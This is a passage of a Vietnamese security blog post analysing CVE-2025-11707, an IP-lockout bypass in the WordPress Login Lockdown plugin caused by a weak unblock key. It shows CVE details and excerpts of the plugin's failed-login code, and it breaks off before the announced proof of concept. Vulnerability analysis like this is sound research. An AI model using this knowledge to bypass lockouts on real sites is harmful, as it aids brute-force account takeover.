<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-11707 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Login Lockdown Plugin."><meta name="keywords" content='analyst, plugin, Bypass Vulnerability'>
  <meta itemprop="name" content="CVE-2025-11707 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Login Lockdown Plugin.">
  <meta itemprop="datePublished" content="2026-01-22T19:00:00+07:00">
  <meta itemprop="dateModified" content="2026-01-22T23:05:57+07:00">
  <meta itemprop="wordCount" content="3207">
  <meta itemprop="image" content="http://localhost:1313/posts/2026-01-22-cve-2025-11707/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Bypass Vulnerability"><meta property="og:url" content="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-11707 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Login Lockdown Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-22T19:00:00+07:00">
    <meta property="article:modified_time" content="2026-01-22T23:05:57+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Bypass Vulnerability">
    <meta property="og:image" content="http://localhost:1313/posts/2026-01-22-cve-2025-11707/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2026-01-22-cve-2025-11707/app.png">
  <meta name="twitter:title" content="CVE-2025-11707 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Login Lockdown Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/" title="CVE-2025-11707 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2026-01-23-cve-2025-10745/" title="CVE-2025-10745 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/index.md" title="CVE-2025-11707 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-11707 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2026-01-22-cve-2025-11707\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, Bypass Vulnerability","wordcount":  3207 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2026-01-22-cve-2025-11707\/","datePublished": "2026-01-22T19:00:00+07:00","dateModified": "2026-01-22T23:05:57+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Login Lockdown Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2026-01-22-cve-2025-11707/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2026-01-22-cve-2025-11707/">English</option><option value="/vi/posts/2026-01-22-cve-2025-11707/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2026-01-24-cve-2025-59577/" title="CVE-2025-59577 Analysis &amp; POC">CVE-2025-59577 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-23-cve-2025-10745/" title="CVE-2025-10745 Analysis &amp; POC">CVE-2025-10745 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC">CVE-2025-12788 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-14-cve-2025-3102/" title="CVE-2025-3102 Analysis &amp; POC">CVE-2025-3102 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-12-cve-2025-4796/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-11707 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2026-01-22 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-22">2026-01-22</time></span>&nbsp;<span title="Cập nhật ngày 2026-01-22 23:05:57"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-22">2026-01-22</time></span>&nbsp;<span title="3207 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 3300 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>16 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2026-01-22-cve-2025-11707/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2026-01-22-cve-2025-11707/app.png" height="500" width="1544"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#increment-fails">Increment Fails</a></li>
        <li><a href="#authentication--block">Authentication &amp; Block</a></li>
        <li><a href="#get-unlock-key">Get Unlock Key</a></li>
        <li><a href="#unlock">Unlock</a></li>
      </ul>
    </li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin Login Lockdown &amp; Protection cho WordPress bị tồn tại lỗ hổng cho phép <strong>vượt qua cơ chế chặn IP</strong> trong tất cả các phiên bản từ trước đến <strong>2.14 (bao gồm cả 2.14)</strong>. Nguyên nhân là do khóa <code>$unblock_key</code> không đủ ngẫu nhiên, khiến những người dùng <strong>chưa xác thực</strong> nhưng có quyền truy cập vào email của tài khoản quản trị có thể <strong>tạo ra khóa mở chặn hợp lệ cho địa chỉ IP của họ</strong>. Điều này cho phép kẻ tấn công chưa xác thực <strong>vượt qua việc bị chặn do đăng nhập sai nhiều lần</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-11707" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-11707</a></li>
<li><strong>Vulnerability Type</strong>: Bypass Vulnerability</li>
<li><strong>Affected Versions</strong>: &lt;= 2.14</li>
<li><strong>Patched Versions</strong>: 2.15</li>
<li><strong>CVSS severity</strong>: Low (5.3)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/login-lockdown/" target="_blank" rel="external nofollow noopener noreferrer">WordPress Login Lockdown Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>Login Lockdown</strong>:
<ul>
<li><code>2.14</code> – <strong>vulnerable</strong></li>
<li><code>2.15</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/" target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Ghi chú</p><p>Theo mô tả của CVE, lỗ hổng cho phép kẻ tấn công vượt qua cơ chế chặn IP sau nhiều lần đăng nhập thất bại.
Trước khi phân tích kỹ thuật bypass, cần hiểu rõ <strong>cách plugin thực hiện cơ chế block</strong>.</p></div><h3 class="heading-element" id="increment-fails"><span>Increment Fails</span>
  <a href="#increment-fails" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Plugin đăng ký action hook cho sự kiện đăng nhập thất bại:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="loginlockdown.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">loginlockdown.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span><span class="s1">&#39;wp_login_failed&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;LoginLockdown_Functions&#39;</span><span class="p">,</span> <span class="s1">&#39;loginFailed&#39;</span><span class="p">),</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Khi đăng nhập thất bại, WordPress sẽ gọi hàm <code>loginFailed()</code>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">function</span> <span class="nf">loginFailed</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$error</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">self</span><span class="o">::</span><span class="na">incrementFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$error</span><span class="o">-&gt;</span><span class="na">get_error_code</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Hàm này tiếp tục gọi <code>incrementFails()</code> để lưu lại lần đăng nhập thất bại cùng mã lỗi:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">function</span> <span class="nf">incrementFails</span><span class="p">(</span><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$reason</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$options</span> <span class="o">=</span> <span class="nx">LoginLockdown_Setup</span><span class="o">::</span><span class="na">get_options</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nx">sanitize_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">||</span> <span class="mi">1</span> <span class="o">==</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;lockout_invalid_usernames&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_id</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//phpcs:ignore no need to cache
</span></span></span><span class="line"><span class="cl">      <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span> <span class="c1">//phpcs:ignore
</span></span></span><span class="line"><span class="cl">        <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">lockdown_login_fails</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;user_id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;login_attempt_date&#39;</span> <span class="o">=&gt;</span> <span class="nx">current_time</span><span class="p">(</span><span class="s1">&#39;mysql&#39;</span><span class="p">),</span>
